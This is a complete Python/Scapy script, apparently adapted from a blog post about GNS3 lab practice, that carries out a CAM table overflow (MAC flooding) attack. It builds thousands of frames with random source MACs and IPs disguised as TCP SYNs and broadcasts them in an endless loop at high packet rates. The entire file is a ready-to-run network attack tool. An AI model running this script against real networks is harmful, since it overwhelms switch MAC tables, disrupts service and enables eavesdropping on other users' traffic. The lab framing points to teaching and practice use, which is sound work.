#!/usr/bin/python3
# from https://www.whitewinterwolf.com/posts/2016/06/26/how-to-run-a-cam-table-overflow-attack-in-gns3/

nbpkts = 8192
iface = "eth0"

import sys
from scapy.all import sendpfast, Ether, IP, RandIP, RandMAC, TCP

print("Initializing...")

# We first build all packets...
pkts = []
for i in range(0, nbpkts):
  macaddr = str(RandMAC())
  # Quick-and-dirty way to ensure that the I/G remains unset
  macaddr = macaddr[:1] + "0" + macaddr[2:]
  # This packet structure mimics a TCP SYN sent to a HTTP server.
  # A random dst mac should also work, setting one fixed can be useful
  # to easily filter-out flood-related packets when capturing traffic.
  # You can use IPs valid for your range, but be cautious that if any
  # host is made to send some RST for instance its MAC address will be
  # registered by the switches.
  pkts.append(Ether(src=macaddr, dst="ff:ff:ff:ff:ff:ff")/
              IP(src=str(RandIP()), dst=str(RandIP()))/
              TCP(dport=80, flags="S", options=[('Timestamp', (0, 0))]))

print("Launching attack, press Ctrl+C to stop...")

# ...and then we send them in loop.
while True:
  # Adapt pps (Packets Per Second) to your needs. Running a complex
  # GNS3 topology on a low-end machine will take all the CPU causing
  # packet loss, pps will then need to be high to replay lost packets.
  # Given enough CPU, packet loss can remain low and pps can be lowered
  # too.
  sendpfast(pkts, iface=iface, file_cache=True, pps=5000, loop=999)
